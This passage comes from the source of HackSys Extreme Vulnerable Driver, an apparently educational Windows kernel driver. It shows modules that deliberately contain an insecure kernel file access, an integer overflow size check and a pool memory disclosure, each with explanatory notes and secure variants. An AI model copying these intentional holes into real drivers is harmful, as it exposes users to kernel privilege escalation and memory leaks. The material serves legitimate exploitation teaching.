    <ClInclude Include="NullPointerDereference.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TypeConfusion.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UninitializedMemoryPagedPool.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UninitializedMemoryStack.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WriteNULL.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UseAfterFreeNonPagedPool.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UseAfterFreeNonPagedPoolNx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ArbitraryReadWriteHelperNonPagedPoolNx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ArbitraryIncrement.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ArbitraryWrite.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BufferOverflowNonPagedPool.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BufferOverflowNonPagedPoolNx.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BufferOverflowPagedPoolSession.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BufferOverflowStack.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BufferOverflowStackGS.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DoubleFetch.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HackSysExtremeVulnerableDriver.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="InsecureKernelResourceAccess.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="IntegerOverflow.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MemoryDisclosureNonPagedPool.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MemoryDisclosureNonPagedPoolNx.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="NullPointerDereference.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TypeConfusion.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UninitializedMemoryPagedPool.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UninitializedMemoryStack.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="WriteNULL.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UseAfterFreeNonPagedPool.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UseAfterFreeNonPagedPoolNx.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ArbitraryReadWriteHelperNonPagedPoolNx.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ArbitraryIncrement.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`Driver/HEVD/Windows/InsecureKernelResourceAccess.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    InsecureKernelResourceAccess.c

Abstract:
    This module implements the functions to demonstrate
    insecure kernel resource access vulnerability.

References:
    https://github.com/tyranid/windows-logical-eop-workshop

--*/

#include "InsecureKernelResourceAccess.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerInsecureKernelFileAccess)
#pragma alloc_text(PAGE, InsecureKernelFileAccessIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the Insecure Kernel File Access Vulnerability
/// </summary>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerInsecureKernelFileAccess(
    VOID
)
{
    HANDLE FileHandle = NULL;
    UNICODE_STRING Log = { 0 };
    IO_STATUS_BLOCK IoStatus = { 0 };
    NTSTATUS Status = STATUS_SUCCESS;
    OBJECT_ATTRIBUTES ObjectAttribures = { 0 };
    PCWSTR LogPath = L"\\??\\C:\\Windows\\System32\\HEVD.log";
    UCHAR Message[] = "HackSys Extreme Vulnerable Driver Log";
    ULONG AttributeFlags = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE;
    ULONG CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT;

#ifdef SECURE
    //
    // Secure Note: This is secure because the developer is setting
    // a flag to force the kernel to do an access check
    //

    AttributeFlags |= OBJ_FORCE_ACCESS_CHECK;
#endif

    PAGED_CODE();

    __try
    {
        RtlInitUnicodeString(&Log, LogPath);
        InitializeObjectAttributes(&ObjectAttribures, &Log, AttributeFlags, NULL, NULL);

        DbgPrint("[+] Log Path: %ws\n", LogPath);
        DbgPrint("[+] Log Content: %s\n", Message);

#ifndef SECURE
        DbgPrint("[+] Triggering Insecure Kernel File Access\n");
#endif

        Status = ZwCreateFile(
            &FileHandle,
            MAXIMUM_ALLOWED,
            &ObjectAttribures,
            &IoStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            FILE_OPEN_IF,
            CreateOptions,
            NULL,
            0
        );

        if (NT_SUCCESS(Status))
        {
            ZwWriteFile(
                FileHandle,
                NULL,
                NULL,
                NULL,
                &IoStatus,
                &Message,
                sizeof(Message),
                NULL,
                NULL
            );
        }

        if (FileHandle)
        {
            ZwClose(FileHandle);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Insecure Kernel File Access Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
InsecureKernelFileAccessIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(IrpSp);
    PAGED_CODE();

    Status = TriggerInsecureKernelFileAccess();

    return Status;
}

```

`Driver/HEVD/Windows/InsecureKernelResourceAccess.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    InsecureKernelResourceAccess.h

Abstract:
    This module implements the data structures for
    insecure kernel resource access module.

--*/

#pragma once

#ifndef __INSECURE_KERNEL_RESOURCE_ACCESS_H__
#define __INSECURE_KERNEL_RESOURCE_ACCESS_H__

#include "Common.h"


//
// Function Definitions
//

NTSTATUS
TriggerInsecureKernelFileAccess(
    VOID
);

#endif  // !__INSECURE_KERNEL_RESOURCE_ACCESS_H__

```

`Driver/HEVD/Windows/IntegerOverflow.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    IntegerOverflow.c

Abstract:
    This module implements the functions to demonstrate
    integer overflow (arithmetic overflow) vulnerability.

--*/

#include "IntegerOverflow.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerIntegerOverflow)
#pragma alloc_text(PAGE, IntegerOverflowIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the Integer Overflow Vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <param name="Size">Size of the user mode buffer</param>
/// <returns>NTSTATUS</returns>
__declspec(safebuffers)
NTSTATUS
TriggerIntegerOverflow(
    _In_ PVOID UserBuffer,
    _In_ ULONG Size
)
{
    ULONG Count = 0;
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG BufferTerminator = 0xBAD0B0B0;
    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
    ULONG TerminatorSize = sizeof(BufferTerminator);

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is not doing any arithmetic
        // on the user supplied value. Instead, the developer is subtracting the size of
        // ULONG i.e. 4 on x86 from the size of KernelBuffer. Hence, integer overflow will
        // not occur and this check will not fail
        //

        if (Size > (sizeof(KernelBuffer) - TerminatorSize))
        {
            DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);

            Status = STATUS_INVALID_BUFFER_SIZE;
            return Status;
        }
#else
        DbgPrint("[+] Triggering Integer Overflow (Arithmetic Overflow)\n");

        //
        // Vulnerability Note: This is a vanilla Integer Overflow vulnerability because if
        // 'Size' is 0xFFFFFFFF and we do an addition with size of ULONG i.e. 4 on x86, the
        // integer will wrap down and will finally cause this check to fail
        //

        if ((Size + TerminatorSize) > (ULONG)sizeof(KernelBuffer))
        {
            DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);

            Status = STATUS_INVALID_BUFFER_SIZE;
            return Status;
        }
#endif

        //
        // Perform the copy operation
        //

        while (Count < (Size / sizeof(ULONG)))
        {
            if (*(PULONG)UserBuffer != BufferTerminator)
            {
                KernelBuffer[Count] = *(PULONG)UserBuffer;
                UserBuffer = (PULONG)UserBuffer + 1;
                Count++;
            }
            else
            {
                break;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Integer Overflow Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
IntegerOverflowIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    PVOID UserBuffer = NULL;
    ULONG Size = 0;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerIntegerOverflow(UserBuffer, Size);
    }

    return Status;
}

```

`Driver/HEVD/Windows/IntegerOverflow.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    IntegerOverflow.h

Abstract:
    This module implements the data structures for
    integer overflow (arithmetic overflow) module.

--*/

#pragma once

#ifndef __INTEGER_OVERFLOW_H__
#define __INTEGER_OVERFLOW_H__

#include "Common.h"


//
// Function Definitions
//

NTSTATUS
TriggerIntegerOverflow(
    _In_ PVOID UserBuffer,
    _In_ ULONG Size
);

#endif  // !__INTEGER_OVERFLOW_H__

```

`Driver/HEVD/Windows/MemoryDisclosureNonPagedPool.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    MemoryDisclosureNonPagedPool.c

Abstract:
    This module implements the functions to demonstrate
    memory disclosure in NonPagedPool vulnerability.

--*/

#include "MemoryDisclosureNonPagedPool.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerMemoryDisclosureNonPagedPool)
#pragma alloc_text(PAGE, MemoryDisclosureNonPagedPoolIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the Memory Disclosure in NonPagedPool Vulnerability
/// </summary>
/// <param name="UserOutputBuffer">The pointer to user mode output buffer</param>
/// <param name="Size">Size of the user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerMemoryDisclosureNonPagedPool(
    _In_ PVOID UserOutputBuffer,
    _In_ SIZE_T Size
)
{
    PVOID KernelBuffer = NULL;
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Allocating Pool chunk\n");

        //
        // Allocate Pool chunk
        //

        KernelBuffer = ExAllocatePoolWithTag(
            NonPagedPool,
            (SIZE_T)POOL_BUFFER_SIZE,
            (ULONG)POOL_TAG
        );

        if (!KernelBuffer)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        }

        //
        // Work on the kernel buffer
        //

        RtlFillMemory(KernelBuffer, (SIZE_T)POOL_BUFFER_SIZE, 0x41);

        //
        // After working on the kernel buffer, it's time to give
        // the output to the user
        //

        //
        // Verify if the output buffer resides in user mode
        //

        ProbeForWrite(UserOutputBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserOutputBuffer: 0x%p\n", UserOutputBuffer);
        DbgPrint("[+] UserOutputBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().
        // Hence, there will be no out of bound read of kernel mode memory
        //

        RtlCopyMemory(UserOutputBuffer, KernelBuffer, (SIZE_T)POOL_BUFFER_SIZE);
#else
        DbgPrint("[+] Triggering Memory Disclosure in NonPagedPool\n");

        //
        // Vulnerability Note: This is a vanilla memory disclosure vulnerability
        // because the developer is passing the user supplied value directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of the allocated Pool chunk which will result in reading
        // more data from kernel mode and passing to user mode memory which causes memory
        // disclosure vulnerability
        //

        RtlCopyMemory(UserOutputBuffer, KernelBuffer, Size);
#endif

        if (KernelBuffer)
        {
            DbgPrint("[+] Freeing Pool chunk\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);

            //
            // Free the allocated Pool chunk
            //

            ExFreePoolWithTag(KernelBuffer, (ULONG)POOL_TAG);
            KernelBuffer = NULL;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Memory Disclosure NonPagedPool Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
MemoryDisclosureNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserOutputBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserOutputBuffer = Irp->UserBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.OutputBufferLength;

    if (UserOutputBuffer)
    {
        Status = TriggerMemoryDisclosureNonPagedPool(UserOutputBuffer, Size);
    }

    return Status;
}

```

`Driver/HEVD/Windows/MemoryDisclosureNonPagedPool.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    MemoryDisclosureNonPagedPool.h

Abstract:
    This module implements the data structures for
    memory disclosure in NonPagedPool module.

--*/

#pragma once

#ifndef __MEMORY_DISCLOSURE_NON_PAGED_POOL_H__
#define __MEMORY_DISCLOSURE_NON_PAGED_POOL_H__

#include "Common.h"


//
// Defines
//

#define POOL_BUFFER_SIZE 504


//
// Function Definitions
//

NTSTATUS
TriggerMemoryDisclosureNonPagedPool(
    _In_ PVOID UserOutputBuffer,
    _In_ SIZE_T Size
);

#endif  // !__MEMORY_DISCLOSURE_NON_PAGED_POOL_H__

```

`Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
